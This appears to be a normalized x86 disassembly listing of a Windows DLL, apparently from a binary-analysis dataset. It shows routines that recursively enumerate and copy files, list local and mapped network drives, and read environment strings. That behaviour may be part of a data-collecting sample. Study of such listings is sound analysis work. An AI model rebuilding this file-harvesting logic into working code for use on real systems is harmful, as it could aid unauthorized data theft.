mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
call ebx
mov ecx [ ebp + 0x10 ]
mov edi eax
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
push 0x1
push edi
push esi
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
push esi
call sub_100093d0
mov ecx [ ebp + 0x14 ]
mov [ ecx ] edi
mov ecx [ ebp + 0x10 ]
cmp [ ecx + 0x10 ] eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
push esi
call sub_100093d0
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x50
sub_1000aad0
push ebp
mov ebp esp
sub esp 0x28c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x284 ] eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x280 ] eax
mov eax [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x274 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x27c ] eax
mov eax [ ebp + 0x20 ]
push 0x0
inc [ ecx ]
mov [ ebp - 0x264 ] eax
mov eax [ ebp + 0x24 ]
push edi
mov [ ebp - 0x26c ] esi
mov [ ebp - 0x270 ] edi
mov [ ebp - 0x288 ] ecx
mov [ ebp - 0x260 ] eax
call [ CreateDirectoryW@IAT ]
mov ebx [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x280 ]
inc [ eax ]
jmp r-xdata
call ebx
mov esi eax
cmp esi 0xb7
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x2 ]
lea ebx [ ebx ]
mov ebx [ ebp - 0x264 ]
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x274 ]
test [ eax + 0x48 ] 0x2
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
mov edx 0x2
sar ecx 0x1
lea eax [ ecx + 0x116 ]
xor ecx ecx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
mov edi eax
add esp 0x4
sub eax esi
mov [ ebp - 0x25c ] edi
mov edx esi
mov [ ebp - 0x278 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
cmp [ edi ] 0x0
jne r-xdata
mov esi [ ebp - 0x26c ]
movzx ecx [ edx ]
lea edx [ edx + 0x2 ]
mov [ eax + edx - 0x2 ] cx
test cx cx
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov edx [ rw-data ]
mov esi edx
mov ecx 0x6
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push edi
mov ecx ebx
call sub_10009730
mov ecx [ ebp - 0x260 ]
mov [ ecx ] esi
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
sub edx esi
add edi 0xfffffffe
jmp r-xdata
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
mov ecx edx
lea eax [ ebp - 0x258 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x25c ]
push eax
push esi
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x268 ] eax
cmp eax 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x268 ]
call ebx
mov ebx [ ebp - 0x264 ]
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edx [ ebp - 0x278 ]
mov ecx r--data
lea eax [ ebp - 0x22c ]
push esi
call j_sub_1003f3e3
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
mov ecx [ ebp - 0x260 ]
mov edi [ ebp - 0x270 ]
mov [ ecx ] eax
cmp [ edi ] 0x0
jne r-xdata
movzx eax [ ecx ]
lea ecx [ ecx + 0x2 ]
mov [ edx + ecx - 0x2 ] ax
test ax ax
jne r-xdata
lea edi [ esi - 0x2 ]
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
mov ecx edi
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ax [ edi + 0x2 ]
lea edi [ edi + 0x2 ]
test ax ax
jne r-xdata
mov eax [ r--data ]
lea edx [ ebp - 0x22c ]
mov [ edi ] eax
mov esi edx
lea eax [ ebp - 0x258 ]
push eax
push ebx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov ecx r--data
lea eax [ ebp - 0x22c ]
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push edi
mov ecx ebx
call sub_10009730
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
mov edi [ ebp - 0x25c ]
sub edx esi
add edi 0xfffffffe
test [ ebp - 0x258 ] 0x10
je r-xdata
push ebx
call [ FindClose@IAT ]
push esi
call j_sub_1003f3e3
mov ecx [ ebp - 0x4 ]
add esp 0x4
xor ecx ebp
mov eax 0x1
pop edi
pop esi
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
mov ecx edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x270 ]
mov ecx edi
lea edx [ ecx + 0x2 ]
jmp r-xdata
mov ecx [ ebp - 0x26c ]
mov edx [ ebp - 0x278 ]
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
movzx eax [ ecx ]
lea ecx [ ecx + 0x2 ]
mov [ edx + ecx - 0x2 ] ax
test ax ax
jne r-xdata
lea edi [ esi - 0x2 ]
jmp r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
sub ecx edx
mov edx 0x2
sar ecx 0x1
lea eax [ ecx + 0x111 ]
xor ecx ecx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
mov ebx eax
add esp 0x4
mov esi ebx
mov edx edi
sub esi edi
jmp r-xdata
mov ax [ edi + 0x2 ]
lea edi [ edi + 0x2 ]
test ax ax
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
movzx ecx [ edx ]
lea edx [ edx + 0x2 ]
mov [ esi + edx - 0x2 ] cx
test cx cx
jne r-xdata
mov eax [ r--data ]
lea edx [ ebp - 0x22c ]
mov [ edi ] eax
mov esi edx
jmp r-xdata
lea edi [ ebx - 0x2 ]
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
mov ax [ edi + 0x2 ]
lea edi [ edi + 0x2 ]
test ax ax
jne r-xdata
mov eax [ r--data ]
lea edx [ ebp - 0x22c ]
mov [ edi ] eax
mov esi edx
mov edi edi
mov edi [ ebp - 0x25c ]
sub edx esi
add edi 0xfffffffe
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
sub edx esi
lea edi [ ebx - 0x2 ]
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
mov ecx edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x270 ]
mov ecx edi
lea edx [ ecx + 0x2 ]
jmp r-xdata
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
push [ ebp - 0x260 ]
mov eax [ ebp - 0x284 ]
mov ecx edx
push [ ebp - 0x264 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x25c ]
mov ecx [ ebp - 0x274 ]
inc [ eax ]
push ebx
push esi
call sub_1000a9c0
test eax eax
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
push ebx
call j_sub_1003f3e3
mov ebx [ ebp - 0x268 ]
add esp 0x4
mov eax [ ebp - 0x27c ]
inc [ eax ]
sub ecx edx
mov edx 0x2
sar ecx 0x1
lea eax [ ecx + 0x11b ]
xor ecx ecx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
mov ebx eax
add esp 0x4
mov esi ebx
mov edx edi
sub esi edi
jmp r-xdata
movzx ecx [ edx ]
lea edx [ edx + 0x2 ]
mov [ esi + edx - 0x2 ] cx
test cx cx
jne r-xdata
lea edi [ ebx - 0x2 ]
mov ax [ edi + 0x2 ]
lea edi [ edi + 0x2 ]
test ax ax
jne r-xdata
mov eax [ r--data ]
lea edx [ ebp - 0x22c ]
mov [ edi ] eax
mov esi edx
mov edi edi
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
sub edx esi
lea edi [ ebx - 0x2 ]
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
push [ ebp - 0x260 ]
mov ecx edx
push [ ebp - 0x264 ]
shr ecx 0x2
push [ ebp - 0x27c ]
[ edi ] [ esi ]
push [ ebp - 0x280 ]
mov ecx edx
push [ ebp - 0x284 ]
and ecx 0x3
push [ ebp - 0x288 ]
[ edi ] [ esi ]
mov esi [ ebp - 0x25c ]
mov ecx [ ebp - 0x274 ]
push ebx
push esi
call sub_1000aad0
jmp r-xdata
sub_1000b0a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004cbc3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0x80 ] 0x0
test esi esi
je r-xdata
xor eax eax
mov ecx [ edi - 0x10 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xfffffff0
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
jmp r-xdata
mov ebx [ rw-data ]
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x80 ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x7
call sub_100383b0
push eax
push rw-data
call esi
mov [ esp + 0x14 ] eax
mov [ esp + 0x80 ] 0xffffffff
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
mov edi [ rw-data ]
call [ GetLogicalDrives@IAT ]
mov [ esp + 0x18 ] eax
xor esi esi
mov edi edi
mov ecx 0x14
call sub_100382c0
push eax
push rw-data
call esi
inc esi
cmp esi 0x1a
jb r-xdata
lea edx [ esp + 0x68 ]
mov eax ebx
sub edx ebx
nop
mov edx 0x1
mov ecx esi
shl edx cl
mov eax edx
and eax [ esp + 0x18 ]
cmp eax edx
jne r-xdata
push 0xffffffff
push 0x0
lea eax [ esp + 0x40 ]
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
lea ecx [ esp + 0x24 ]
push eax
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
call sub_100018b0
mov [ esp + 0x80 ] 0x3
lea eax [ esp + 0x1c ]
mov ebx [ esp + 0x14 ]
lea ecx [ ebx + 0x34 ]
cmp ecx eax
je r-xdata
movzx ecx [ eax ]
lea eax [ eax + 0x2 ]
mov [ eax + edx - 0x2 ] cx
test cx cx
jne r-xdata
add [ esp + 0x68 ] si
cmp [ esp + 0x48 ] 0x0
jbe r-xdata
mov [ esp + 0x80 ] 0x1
cmp [ esp + 0x30 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
lea eax [ esp + 0x68 ]
push eax
lea eax [ esp + 0x54 ]
push eax
call sub_1000b360
mov [ esp + 0x80 ] 0x2
lea ecx [ esp + 0x38 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x80 ] 0x1
cmp [ esp + 0x64 ] 0x10
jb r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] 0x0
test ebx ebx
jne r-xdata
push [ esp + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] 0x0
push [ esp + 0x50 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x8 ]
add esi ebx
xor esi esi
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0x40 ]
call sub_10005470
mov [ esp + 0x4c ] 0xf
mov eax esi
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x80 ] 0xffffffff
cmp [ esp + 0x4c ] 0x10
jb r-xdata
sub_1000b360
push ebp
mov ebp esp
push 0xffffffff
push sub_1004cc3e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x464
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x464 ] 0x0
mov [ ebp - 0x470 ] ebx
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
mov [ ebp - 0x45c ] eax
mov [ ebx ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov edi [ InterlockedExchange@IAT ]
mov [ ebp - 0x464 ] 0x1
jne r-xdata
mov esi [ rw-data ]
sub esp 0x18
mov edx esp
mov [ ebp - 0x468 ] esp
xor ecx ecx
mov [ edx + 0x14 ] 0x7
mov [ edx + 0x10 ] 0x0
mov [ edx ] cx
cmp [ eax ] cx
je r-xdata
mov ecx 0x15
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ ebp - 0x45c ]
push ecx
push eax
mov ecx edx
call sub_10009730
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x440 ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
mov ecx ebx
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x42c ] 0x10
jb r-xdata
mov ecx eax
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x46c ] eax
mov edi edi
cmp [ esi ] 0x0
mov [ ebp - 0x42c ] 0xf
mov [ ebp - 0x430 ] 0x0
mov [ ebp - 0x440 ] 0x0
jne r-xdata
push [ ebp - 0x440 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x46c ]
mov eax [ ebp - 0x45c ]
sar ecx 0x1
mov ecx esi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
mov ecx ebx
call sub_10005470
push [ ebp - 0x45c ]
call [ GetDriveTypeW@IAT ]
cmp eax 0x2
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp eax 0x5
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
lea ecx [ eax + 0x14 ]
call sub_100382c0
push eax
push rw-data
call edi
cmp eax 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
lea ecx [ eax + 0x14 ]
call sub_100382c0
push eax
push rw-data
call edi
mov ecx edx
lea edi [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
lea ecx [ eax + 0x13 ]
call sub_100382c0
push eax
push rw-data
call edi
mov ecx edx
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
mov ecx ebx
call sub_10005470
cmp [ esi ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov ecx ebx
push eax
call sub_10005430
push esi
mov ecx 0x1c
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
mov ecx ebx
push eax
call sub_10005430
push esi
mov ecx ebx
call sub_10005430
push 0x209
lea eax [ ebp - 0x428 ]
push 0x0
push eax
call sub_10045ec0
add esp 0xc
mov [ ebp - 0x460 ] 0x209
lea eax [ ebp - 0x460 ]
push eax
lea eax [ ebp - 0x428 ]
push eax
push [ ebp - 0x45c ]
call [ WNetGetConnectionW@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x15 ]
call sub_100382c0
push eax
push rw-data
call edi
mov ecx edx
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
mov ecx ebx
call sub_10005470
cmp [ esi ] 0x0
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
mov edi edi
xor ecx ecx
push ecx
push esi
mov ecx ebx
call sub_10005470
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
lea ecx [ eax + 0x1a ]
call sub_10038420
mov ecx 0x1b
mov esi eax
call sub_10038420
push esi
mov ecx ebx
mov edi eax
call sub_10005430
sub esp 0x18
lea eax [ ebp - 0x428 ]
mov ecx esp
mov [ ebp - 0x468 ] esp
push eax
call sub_10009370
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x458 ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x458 ]
call sub_10001880
push edi
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
mov ecx ebx
call sub_10005470
cmp [ esi ] 0x0
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
push ecx
push esi
mov ecx ebx
call sub_10005470
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
mov ecx ebx
call sub_10005470
jmp r-xdata
mov ecx ebx
call sub_10005430
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
push ecx
push esi
mov ecx ebx
call sub_10005470
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
mov ecx ebx
call sub_10005470
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
mov ecx ebx
call sub_10005470
jmp r-xdata
sub_1000b7a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004cc93
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0x60 ] 0x0
test esi esi
je r-xdata
xor ebx ebx
mov ecx [ edi - 0x10 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xfffffff0
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov ebx eax
jmp r-xdata
mov edi [ rw-data ]
mov ecx eax
lea edx [ ecx + 0x2 ]
jmp r-xdata
mov ecx 0x8
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov eax esi
mov [ esp + 0x60 ] 0xffffffff
call [ GetEnvironmentStringsW@IAT ]
xor ecx ecx
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] cx
mov [ esp + 0x60 ] 0x1
mov esi eax
cmp [ rw-data ] ecx
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
je r-xdata
push [ esp + 0x18 ]
call [ FreeEnvironmentStringsW@IAT ]
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x58 ]
push eax
call sub_10003a20
mov [ esp + 0x78 ] 0x2
mov [ esp + 0x78 ] 0x1
lea ecx [ esp + 0x34 ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x60 ] 0x3
lea ecx [ ebx + 0x34 ]
lea eax [ esp + 0x1c ]
cmp ecx eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov [ esp + 0x60 ] 0x1
cmp [ esp + 0x30 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov eax esi
lea edx [ eax + 0x2 ]
xor eax eax
jmp r-xdata
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] 0x0
test ebx ebx
jne r-xdata
push [ esp + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ esp + 0x40 ]
call sub_10005dc0
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x8 ]
add esi ebx
xor esi esi
jmp r-xdata
mov ecx edi
lea edx [ ecx + 0x2 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
xor eax eax
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x38 ] ax
mov eax esi
mov [ esp + 0x48 ] 0x0
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x60 ] 0xffffffff
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push edi
lea ecx [ esp + 0x40 ]
call sub_10005dc0
mov ecx esi
lea edx [ ecx + 0x2 ]
nop
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
lea esi [ esi + ecx * 2 ]
add esi 0x2
mov ecx esi
lea edx [ ecx + 0x2 ]
lea ebx [ ebx ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
jne r-xdata
sub_1000ba30
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c889
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
add ecx 0x1c
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
call sub_10003a20
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000bab0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004cdad
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc08 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc20 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x84 ]
push 0x1
push eax
mov [ esp + 0x34 ] eax
call sub_100080c0
mov [ esp + 0xc28 ] 0x0
cmp [ esp + 0x8c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x20 ] 0xffffffff
jne r-xdata
mov eax [ ebx - 0x48 ]
lea ecx [ ebx - 0x48 ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x88 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x44 ] esp
mov [ esp + 0x34 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0xc40 ] 0x1
push ebx
push [ esp + 0x38 ]
mov [ esp + 0xc48 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov esi [ rw-data ]
sub esp 0x18
mov edx esp
mov [ esp + 0x3c ] esp
xor eax eax
mov [ edx + 0x14 ] 0x7
mov [ edx + 0x10 ] 0x0
mov [ edx ] ax
cmp [ esi ] ax
jne r-xdata
mov ecx 0x9
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ esp + 0xc28 ] 0xffffffff
mov [ esp + 0x84 ] r--data
mov [ esp + 0xc28 ] 0x14
cmp [ esp + 0xa0 ] 0x0
jbe r-xdata
mov ecx esi
lea edi [ ecx + 0x2 ]
mov edi edi
xor ecx ecx
jmp r-xdata
mov [ esp + 0xc28 ] 0xffffffff
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
cmp [ esp + 0xa4 ] 0x8
lea eax [ esp + 0x90 ]
cmovae eax [ esp + 0x90 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
push esi
mov ecx edx
call sub_10009730
mov [ esp + 0xc40 ] 0x2
mov [ esp + 0xc40 ] 0x0
lea ecx [ esp + 0xf0 ]
call sub_1003baa0
mov [ esp + 0xc28 ] 0x3
sub esp 0x18
mov ecx esp
mov [ esp + 0x3c ] esp
xor eax eax
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push r--data
mov [ ecx ] ax
call sub_10009730
mov [ esp + 0xc40 ] 0x4
mov [ esp + 0xc40 ] 0x3
lea ecx [ esp + 0xf0 ]
call sub_1003bc50
test eax eax
jne r-xdata
xor eax eax
mov [ esp + 0xa4 ] 0x7
mov [ esp + 0x90 ] ax
mov eax esi
mov [ esp + 0xa0 ] 0x0
mov ecx [ esp + 0xc20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xc08 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x90 ]
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0xdc ]
call sub_1000ba30
mov [ esp + 0xc28 ] 0x5
lea ecx [ esp + 0x30 ]
cmp [ esp + 0x80 ] 0x8
lea eax [ esp + 0x6c ]
push 0x0
